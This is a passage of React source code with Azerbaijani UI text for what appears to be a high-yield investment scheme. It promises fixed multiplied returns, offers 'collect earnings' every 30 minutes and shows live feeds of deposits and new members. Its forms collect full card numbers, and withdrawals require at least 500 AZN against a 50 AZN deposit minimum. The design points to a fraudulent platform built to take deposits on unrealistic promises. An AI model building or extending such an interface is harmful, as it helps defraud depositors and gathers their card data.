                                className="w-full bg-gradient-to-r from-green-600 to-green-500 hover:from-green-700 hover:to-green-600 disabled:opacity-50 disabled:cursor-not-allowed text-lg py-3"
                              >
                                <Gift className="w-5 h-5 mr-2" />
                                Qazancı Götür
                              </Button>
                            ) : (
                              <div className="w-full">
                                <Button
                                  disabled={true}
                                  className="w-full bg-gray-600 opacity-50 cursor-not-allowed text-lg py-3 mb-2"
                                >
                                  <Timer className="w-5 h-5 mr-2" />
                                  Gözləmə Vaxtı
                                </Button>
                                {countdown && (
                                  <div className="text-center">
                                    <div className="text-sm text-gray-400">Növbəti toplama:</div>
                                    <div className="text-lg font-bold text-yellow-400">
                                      {countdown.minutes}:{String(countdown.seconds).padStart(2, '0')}
                                    </div>
                                    <div className="text-xs text-gray-500">
                                      (30 dəqiqə arayla)
                                    </div>
                                  </div>
                                )}
                              </div>
                            )}
                          </div>
                        </div>
                      </Card>
                    );
                  })}
                </div>

                {/* Live Activities for logged in users with active packages */}
                <div className="grid lg:grid-cols-2 gap-6 sm:gap-8">
                  {/* Live Transactions */}
                  <Card className="bg-gray-900 border-gray-800 p-4 sm:p-6">
                    <div className="flex items-center justify-between mb-4">
                      <h3 className="text-base sm:text-lg font-bold text-yellow-400">Canlı Əməliyyatlar</h3>
                      <div className="flex items-center space-x-2">
                        <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                        <span className="text-xs text-green-400">CANLI</span>
                      </div>
                    </div>

                    <div className="space-y-3 max-h-80 sm:max-h-96 overflow-y-auto">
                      {transactions.map((txn) => (
                        <div key={txn.id} className="bg-gray-800 rounded-lg p-3 slide-up border-l-4 border-l-yellow-400">
                          <div className="flex justify-between items-start">
                            <div className="flex-1">
                              <div className="flex items-center space-x-2">
                                <span className="font-medium text-white text-xs sm:text-sm">
                                  {showBalances ? txn.name : blurName(txn.name)}
                                </span>
                                <Badge className={`text-xs ${txn.type === 'deposit' ? 'bg-green-600' : 'bg-blue-600'}`}>
                                  {txn.type === 'deposit' ? 'Yatırım' : 'Çıxarış'}
                                </Badge>
                              </div>
                              <div className="text-xs text-gray-400 mt-1">
                                {txn.bank}
                              </div>
                            </div>
                            <div className="text-right">
                              <div className={`font-bold text-xs sm:text-sm ${txn.type === 'deposit' ? 'text-green-400' : 'text-red-400'}`}>
                                {txn.type === 'deposit' ? '+' : '-'}{formatAmount(txn.amount)} AZN
                              </div>
                              <div className="text-xs text-gray-500">
                                {new Date(txn.timestamp).toLocaleTimeString()}
                              </div>
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>

                    <div className="mt-4 flex justify-center">
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={() => setShowBalances(!showBalances)}
                        className="border-gray-600 text-gray-400 hover:text-white text-xs"
                      >
                        {showBalances ? <EyeOff className="w-3 h-3 sm:w-4 sm:h-4 mr-1" /> : <Eye className="w-3 h-3 sm:w-4 sm:h-4 mr-1" />}
                        {showBalances ? 'Adları Gizlə' : 'Adları Göstər'}
                      </Button>
                    </div>
                  </Card>

                  {/* Live Memberships */}
                  <Card className="bg-gray-900 border-gray-800 p-4 sm:p-6">
                    <div className="flex items-center justify-between mb-4">
                      <h3 className="text-base sm:text-lg font-bold text-yellow-400">Yeni Üzvlər</h3>
                      <div className="flex items-center space-x-2">
                        <div className="w-2 h-2 bg-purple-400 rounded-full animate-pulse"></div>
                        <span className="text-xs text-purple-400">CANLI</span>
                      </div>
                    </div>

                    <div className="space-y-3 max-h-80 sm:max-h-96 overflow-y-auto">
                      {membershipActivities.map((member) => (
                        <div key={member.id} className="bg-gray-800 rounded-lg p-3 slide-up border-l-4 border-l-purple-400">
                          <div className="flex justify-between items-center">
                            <div className="flex-1">
                              <div className="flex items-center space-x-2">
                                <Users className="w-3 h-3 sm:w-4 sm:h-4 text-purple-400" />
                                <span className="font-medium text-white text-xs sm:text-sm">
                                  {showBalances ? member.name : blurName(member.name)}
                                </span>
                              </div>
                              <div className="text-xs text-gray-400 mt-1">
                                {member.action}
                              </div>
                            </div>
                            <div className="text-xs text-gray-500">
                              {new Date(member.timestamp).toLocaleTimeString()}
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  </Card>
                </div>
              </div>
            )}

          </div>
        )}
      </main>

      {/* Dialogs */}
      <Dialog open={packageConfirmOpen} onOpenChange={setPackageConfirmOpen}>
        <DialogContent className="bg-gray-900 border-gray-700 mx-4 max-w-md">
          <DialogHeader>
            <DialogTitle className="text-white">Paket Təsdiqi</DialogTitle>
          </DialogHeader>
          <PackageConfirmation 
            package={selectedPackage ? packageDefinitions[selectedPackage] : null}
            amount={selectedAmount}
            expectedProfit={expectedProfit}
            onConfirm={confirmPackagePurchase}
            onCancel={() => setPackageConfirmOpen(false)}
          />
        </DialogContent>
      </Dialog>

      <Dialog open={supportOpen} onOpenChange={setSupportOpen}>
        <DialogContent className="bg-gray-900 border-gray-700 mx-4 max-w-md">
          <DialogHeader>
            <DialogTitle className="text-white">Dəstək Mərkəzi</DialogTitle>
          </DialogHeader>
          <SupportForm onSend={sendSupportMessage} messages={messages} />
        </DialogContent>
      </Dialog>

      <Dialog open={pendingOpen} onOpenChange={setPendingOpen}>
        <DialogContent className="bg-gray-900 border-gray-700 mx-4 max-w-3xl">
          <DialogHeader>
            <DialogTitle className="text-white">Gözləyən Əməliyyatlar</DialogTitle>
          </DialogHeader>
          <PendingTransactionsView transactions={pendingTransactions} />
        </DialogContent>
      </Dialog>

      <Dialog open={withdrawOpen} onOpenChange={setWithdrawOpen}>
        <DialogContent className="bg-gray-900 border-gray-700 mx-4 max-w-sm">
          <DialogHeader>
            <DialogTitle className="text-white">Çıxarış Et</DialogTitle>
          </DialogHeader>
          <WithdrawForm onWithdraw={handleWithdraw} maxAmount={user?.balance || 0} />
        </DialogContent>
      </Dialog>

      <Dialog open={depositOpen} onOpenChange={setDepositOpen}>
        <DialogContent className="bg-gray-900 border-gray-700 mx-4 max-w-sm">
          <DialogHeader>
            <DialogTitle className="text-white">Yatırım Et</DialogTitle>
          </DialogHeader>
          <DepositForm onDeposit={handleDeposit} />
        </DialogContent>
      </Dialog>

      <Dialog open={notificationsOpen} onOpenChange={setNotificationsOpen}>
        <DialogContent className="bg-gray-900 border-gray-700 mx-4 max-w-md">
          <DialogHeader>
            <DialogTitle className="text-white">Bildirişlər</DialogTitle>
          </DialogHeader>
          <NotificationsView 
            pendingTransactions={pendingTransactions}
            messages={messages}
          />
        </DialogContent>
      </Dialog>
    </div>
  );
};

// New Package Card Component - NO preset amounts, customer enters everything
const NewPackageCard = ({ packageKey, package: pkg, onSelect, userBalance }) => {
  const [investAmount, setInvestAmount] = useState('');

  const totalEarnings = investAmount ? parseFloat(investAmount) * pkg.multiplier : 0;
  const profit = totalEarnings - (investAmount ? parseFloat(investAmount) : 0);

  const handleSelect = () => {
    const amount = parseFloat(investAmount);
    if (!amount || amount < pkg.minAmount || amount > pkg.maxAmount) {
      alert(`❌ Zəhmət olmasa ${pkg.minAmount}-${pkg.maxAmount} AZN arası məbləğ daxil edin.`);
      return;
    }
    onSelect(packageKey, amount);
  };

  return (
    <Card className="bg-gradient-to-b from-gray-900 to-gray-800 border-gray-700 p-6 hover:border-yellow-400 transition-all duration-300 transform hover:scale-105 relative overflow-hidden">
      <div className="absolute top-2 right-2">
        <Sparkles className="w-6 h-6 text-yellow-400 animate-pulse" />
      </div>
      
      <div className="text-center">
        <div className="text-6xl mb-4 animate-bounce" style={{ color: pkg.color }}>
          {pkg.icon}
        </div>
        <h3 className="text-2xl font-bold text-white mb-4">{pkg.name}</h3>
        
        <div className="space-y-4">
          <div>
            <label className="block text-sm text-gray-400 mb-2">İnvestisiya məbləği daxil edin</label>
            <Input
              type="number"
              value={investAmount}
              onChange={(e) => setInvestAmount(e.target.value)}
              placeholder="Məbləğ daxil edin..."
              className="bg-gray-800 border-gray-600 text-white text-center text-lg font-bold"
            />
            <div className="text-xs text-gray-500 mt-1">
              {pkg.minAmount} - {pkg.maxAmount} AZN arası
            </div>
          </div>

          {investAmount && parseFloat(investAmount) >= pkg.minAmount && parseFloat(investAmount) <= pkg.maxAmount && (
            <div className="bg-gray-800 rounded-lg p-4 space-y-2">
              <div className="flex justify-between">
                <span className="text-gray-400 text-sm">İnvestisiya:</span>
                <span className="text-white font-bold">{formatAmount(parseFloat(investAmount))} AZN</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400 text-sm">Çarpan:</span>
                <span className="text-yellow-400 font-bold">{pkg.multiplier}x</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400 text-sm">Müddət:</span>
                <span className="text-blue-400 font-bold">{pkg.duration} gün</span>
              </div>
              <hr className="border-gray-700" />
              <div className="flex justify-between">
                <span className="text-gray-400 text-sm">Ümumi gəlir:</span>
                <span className="text-green-400 font-bold">{formatAmount(totalEarnings)} AZN</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400 text-sm">Təmiz qazanc:</span>
                <span className="text-yellow-400 font-bold">{formatAmount(profit)} AZN</span>
              </div>
            </div>
          )}

          {investAmount && parseFloat(investAmount) >= pkg.minAmount && parseFloat(investAmount) <= pkg.maxAmount && (
            <Alert className="bg-blue-900/50 border-blue-600">
              <AlertTriangle className="h-4 w-4 text-blue-400" />
              <AlertDescription className="text-blue-200 text-sm">
                {pkg.duration} gün sonra toplam <strong>{formatAmount(totalEarnings)} AZN</strong> qazanacaqsınız!
              </AlertDescription>
            </Alert>
          )}

          {investAmount && userBalance < parseFloat(investAmount) && (
            <Alert className="bg-red-900/50 border-red-600">
              <AlertTriangle className="h-4 w-4 text-red-400" />
              <AlertDescription className="text-red-200 text-sm">
                Balansınızda kifayət qədər vəsait yoxdur.
              </AlertDescription>
            </Alert>
          )}

          <Button
            onClick={handleSelect}
            disabled={!investAmount || parseFloat(investAmount) < pkg.minAmount || parseFloat(investAmount) > pkg.maxAmount || userBalance < parseFloat(investAmount)}
            className="w-full font-bold py-3 text-black hover:opacity-80"
            style={{ backgroundColor: pkg.color }}
          >
            Seç və Al
          </Button>
        </div>
      </div>
    </Card>
  );
};

// Package Confirmation Component
const PackageConfirmation = ({ package: pkg, amount, expectedProfit, onConfirm, onCancel }) => {
  if (!pkg) return null;

  return (
    <div className="space-y-6">
      <div className="text-center">
        <div className="text-4xl mb-2" style={{ color: pkg.color }}>
          {pkg.icon}
        </div>
        <h3 className="text-xl font-bold text-white">{pkg.name}</h3>
      </div>

      <div className="bg-gray-800 rounded-lg p-4">
        <h4 className="font-bold text-white mb-3">Alış Təfərrüatları</h4>
        <div className="space-y-2 text-sm">
          <div className="flex justify-between">
            <span className="text-gray-400">İnvestisiya:</span>
            <span className="text-white font-bold">{formatAmount(amount)} AZN</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-400">Müddət:</span>
            <span className="text-white">{pkg.duration} gün</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-400">Çarpan:</span>
            <span className="text-yellow-400">{pkg.multiplier}x</span>
          </div>
          <hr className="border-gray-700" />
          <div className="flex justify-between">
            <span className="text-gray-400">Gözlənilən ümumi gəlir:</span>
            <span className="text-green-400 font-bold">{formatAmount(expectedProfit)} AZN</span>
          </div>
          <div className="flex justify-between">
            <span className="text-gray-400">Təmiz qazanc:</span>
            <span className="text-yellow-400 font-bold">{formatAmount(expectedProfit - amount)} AZN</span>
          </div>
        </div>
      </div>

      <Alert className="bg-green-900/50 border-green-600">
        <CheckCircle className="h-4 w-4 text-green-400" />
        <AlertDescription className="text-green-200">
          Bu paketi təsdiqləsəniz, {pkg.duration} gün ərzində gəliriniz toplanacaq və hər 30 dəqiqədə bir çıxara bilərsiniz.
        </AlertDescription>
      </Alert>

      <div className="flex space-x-3">
        <Button onClick={onCancel} variant="outline" className="flex-1">
          Ləğv Et
        </Button>
        <Button onClick={onConfirm} className="flex-1 bg-green-600 hover:bg-green-700">
          <CheckCircle className="w-4 h-4 mr-2" />
          Təsdiq Et
        </Button>
      </div>
    </div>
  );
};

// Support Form Component
const SupportForm = ({ onSend, messages }) => {
  const [message, setMessage] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (message.trim()) {
      onSend(message);
      setMessage('');
    }
  };

  return (
    <div className="space-y-4">
      <div className="max-h-60 overflow-y-auto space-y-3">
        {messages.slice(0, 10).map((msg) => (
          <div key={msg.id} className={`p-3 rounded-lg ${msg.is_from_admin ? 'bg-blue-900/50 border-l-4 border-blue-400' : 'bg-gray-800 border-l-4 border-yellow-400'}`}>
            <div className="flex items-center justify-between mb-1">
              <span className="text-xs text-gray-400">
                {msg.is_from_admin ? 'Admin' : 'Siz'}
              </span>
              <span className="text-xs text-gray-500">
                {new Date(msg.created_date).toLocaleString()}
              </span>
            </div>
            <p className="text-white text-sm">{msg.content}</p>
          </div>
        ))}
      </div>

      <form onSubmit={handleSubmit} className="space-y-3">
        <Input
          value={message}
          onChange={(e) => setMessage(e.target.value)}
          placeholder="Mesajınızı yazın..."
          className="bg-gray-800 border-gray-600 text-white"
        />
        <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700">
          <MessageCircle className="w-4 h-4 mr-2" />
          Göndər
        </Button>
      </form>
    </div>
  );
};

// Notifications View Component
const NotificationsView = ({ pendingTransactions, messages }) => {
  return (
    <div className="space-y-4 max-h-96 overflow-y-auto">
      <h3 className="font-bold text-yellow-400">Gözləyən Əməliyyatlar</h3>
      {pendingTransactions.length === 0 ? (
        <p className="text-gray-400 text-sm">Gözləyən əməliyyat yoxdur.</p>
      ) : (
        pendingTransactions.map((txn) => (
          <div key={txn.id} className="bg-gray-800 rounded-lg p-3 border-l-4 border-l-yellow-400">
            <div className="flex justify-between items-center">
              <div>
                <span className="text-white font-medium">
                  {txn.type === 'deposit' ? '💰 Depozit' : '🏦 Çıxarış'}
                </span>
                <div className="text-yellow-400 font-bold">
                  {formatAmount(txn.amount)} AZN
                </div>
              </div>
              <Badge className="bg-yellow-600">İcrada</Badge>
            </div>
          </div>
        ))
      )}

      <h3 className="font-bold text-yellow-400 mt-6">Yeni Mesajlar</h3>
      {messages.filter(m => m.is_from_admin && !m.is_read).length === 0 ? (
        <p className="text-gray-400 text-sm">Yeni mesaj yoxdur.</p>
      ) : (
        messages.filter(m => m.is_from_admin && !m.is_read).map((msg) => (
          <div key={msg.id} className="bg-gray-800 rounded-lg p-3 border-l-4 border-l-blue-400">
            <div className="text-blue-400 text-xs mb-1">Admin-dən</div>
            <p className="text-white text-sm">{msg.content}</p>
          </div>
        ))
      )}
    </div>
  );
};

// Other existing components (LoginForm, RegisterForm, etc.) remain the same...
const LoginForm = ({ onLogin }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (email && password) {
      onLogin(email, password);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">Email</label>
        <Input
          type="email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="bg-gray-800 border-gray-600 text-white"
          placeholder="email@example.com"
          required
        />
      </div>
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">Şifrə</label>
        <Input
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="bg-gray-800 border-gray-600 text-white"
          placeholder="••••••••"
          required
        />
      </div>
      <Button type="submit" className="w-full bg-yellow-400 text-black hover:bg-yellow-500">
        Daxil Ol
      </Button>
    </form>
  );
};

const RegisterForm = ({ onRegister }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [name, setName] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    if (email && password && name) {
      onRegister(email, password, name);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">Ad Soyad</label>
        <Input
          type="text"
          value={name}
          onChange={(e) => setName(e.target.value)}
          className="bg-gray-800 border-gray-600 text-white"
          placeholder="Ad Soyad"
          required
        />
      </div>
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">Email</label>
        <Input
          type="email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="bg-gray-800 border-gray-600 text-white"
          placeholder="email@example.com"
          required
        />
      </div>
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">Şifrə</label>
        <Input
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="bg-gray-800 border-gray-600 text-white"
          placeholder="••••••••"
          required
        />
      </div>
      <Button type="submit" className="w-full bg-yellow-400 text-black hover:bg-yellow-500">
        <Sparkles className="w-4 h-4 mr-2" />
        Qeydiyyatdan Keç
      </Button>
    </form>
  );
};

const WithdrawForm = ({ onWithdraw, maxAmount }) => {
  const [amount, setAmount] = useState('');
  const [cardName, setCardName] = useState('');
  const [cardNumber, setCardNumber] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    const amountNum = parseFloat(amount);
    
    // New withdrawal limits: 500-6500 AZN
    if (amountNum < 500 || amountNum > 6500) {
      alert('❌ Çıxarış məbləği 500-6500 AZN arası olmalıdır.');
      return;
    }
    
    if (amountNum > maxAmount) {
      alert('❌ Balansınızda kifayət qədər vəsait yoxdur.');
      return;
    }
    
    if (cardName && cardNumber.length === 16) {
      onWithdraw(amountNum, cardName, cardNumber);
      setAmount('');
      setCardName('');
      setCardNumber('');
    } else {
      alert('❌ Zəhmət olmasa bütün məlumatları düzgün daxil edin.');
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">Çıxarış Məbləği (AZN)</label>
        <Input
          type="number"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          className="bg-gray-800 border-gray-600 text-white"
          placeholder="0.00"
          min="500"
          max="6500"
          step="0.01"
          required
        />
        <div className="text-xs text-gray-400 mt-1">Minimum: 500 AZN, Maksimum: 6500 AZN</div>
      </div>
      
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">Kart Üstündə Ad Soyad</label>
        <Input
          type="text"
          value={cardName}
          onChange={(e) => setCardName(e.target.value)}
          className="bg-gray-800 border-gray-600 text-white"
          placeholder="ELVIN MAHMUDOV"
          required
        />
      </div>

      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">Kart Nömrəsi (16 rəqəm)</label>
        <Input
          type="text"
          value={cardNumber}
          onChange={(e) => {
            const value = e.target.value.replace(/\D/g, '');
            if (value.length <= 16) {
              setCardNumber(value);
            }
          }}
          className="bg-gray-800 border-gray-600 text-white"
          placeholder="1234567890123456"
          maxLength="16"
          required
        />
        <div className="text-xs text-gray-400 mt-1">{cardNumber.length}/16 rəqəm</div>
      </div>

      <Button type="submit" className="w-full bg-red-500 text-white hover:bg-red-600">
        <CreditCard className="w-4 h-4 mr-2" />
        Çıxarış Et
      </Button>
    </form>
  );
};

const DepositForm = ({ onDeposit }) => {
  const [amount, setAmount] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [receipt, setReceipt] = useState(null);

  const handleSubmit = (e) => {
    e.preventDefault();
    const amountNum = parseFloat(amount);
    
    // New deposit limits: 50-2500 AZN
    if (amountNum < 50 || amountNum > 2500) {
      alert('❌ Depozit məbləği 50-2500 AZN arası olmalıdır.');
      return;
    }
    
    if (cardNumber.length === 16) {
      onDeposit(amountNum, cardNumber, receipt);
      setAmount('');
      setCardNumber('');
      setReceipt(null);
    } else {
      alert('❌ Zəhmət olmasa bütün məlumatları düzgün daxil edin.');
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">Depozit Məbləği (AZN)</label>
        <Input
          type="number"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          className="bg-gray-800 border-gray-600 text-white"
          placeholder="0.00"
          min="50"
          max="2500"
          step="0.01"
          required
        />
        <div className="text-xs text-gray-400 mt-1">Minimum: 50 AZN, Maksimum: 2500 AZN</div>
      </div>

      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">Kart Nömrəsi (16 rəqəm)</label>
        <Input
          type="text"
          value={cardNumber}
          onChange={(e) => {
            const value = e.target.value.replace(/\D/g, '');
            if (value.length <= 16) {
              setCardNumber(value);
            }
          }}
          className="bg-gray-800 border-gray-600 text-white"
          placeholder="1234567890123456"
          maxLength="16"
          required
        />
        <div className="text-xs text-gray-400 mt-1">{cardNumber.length}/16 rəqəm</div>
      </div>

      <div>
        <label className="block text-sm font-medium text-gray-300 mb-2">Dekont (JPG, PNG, PDF)</label>
        <Input
          type="file"
          onChange={(e) => setReceipt(e.target.files[0])}
          className="bg-gray-800 border-gray-600 text-white"
          accept=".jpg,.jpeg,.png,.pdf"
        />
      </div>

      <Button type="submit" className="w-full bg-green-500 text-white hover:bg-green-600">
        <Upload className="w-4 h-4 mr-2" />
        Depozit Et
      </Button>
    </form>
  );
};

const PendingTransactionsView = ({ transactions }) => {
  if (!transactions.length) {
    return (
      <div className="text-center py-8">
        <Clock className="w-16 h-16 text-gray-400 mx-auto mb-4" />
        <p className="text-gray-400">Gözləyən əməliyyat yoxdur.</p>
      </div>
    );
  }

  return (
    <div className="space-y-4 max-h-96 overflow-y-auto">
      {transactions.map((txn) => (
        <Card key={txn.id} className="bg-gray-800 border-gray-700 p-4">
          <div className="flex justify-between items-start">
            <div className="flex-1">
              <div className="flex items-center space-x-3 mb-2">
                <div className="text-2xl">
                  {txn.type === 'deposit' ? '💰' : '🏦'}
                </div>
                <div>
                  <h3 className="font-bold text-white">
                    {txn.type === 'deposit' ? 'Depozit' : 'Çıxarış'}
                  </h3>
                  <div className="text-sm text-gray-400">
                    {new Date(txn.created_date).toLocaleString()}
                  </div>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-4 text-sm">
                <div>
                  <span className="text-gray-400">Məbləğ:</span>
                  <div className="font-bold text-yellow-400">
                    {formatAmount(txn.amount)} AZN
                  </div>
                </div>
                {txn.type === 'withdraw' && (
                  <div>
                    <span className="text-gray-400">Kart:</span>
                    <div className="text-white">****{txn.card_number?.slice(-4)}</div>
                  </div>
                )}
                {txn.type === 'deposit' && txn.receipt_filename && (
                  <div>
                    <span className="text-gray-400">Dekont:</span>
                    <div className="text-blue-400">{txn.receipt_filename}</div>
                  </div>
                )}
              </div>
            </div>
            <div className="text-right">
              <Badge className="bg-yellow-600 animate-pulse">
                İcrada
              </Badge>
              <div className="text-xs text-gray-500 mt-1">
                Admin yoxlaması gözlənilir
              </div>
            </div>
          </div>
        </Card>
      ))}
    </div>
  );
};

export default InvestmentPlatform;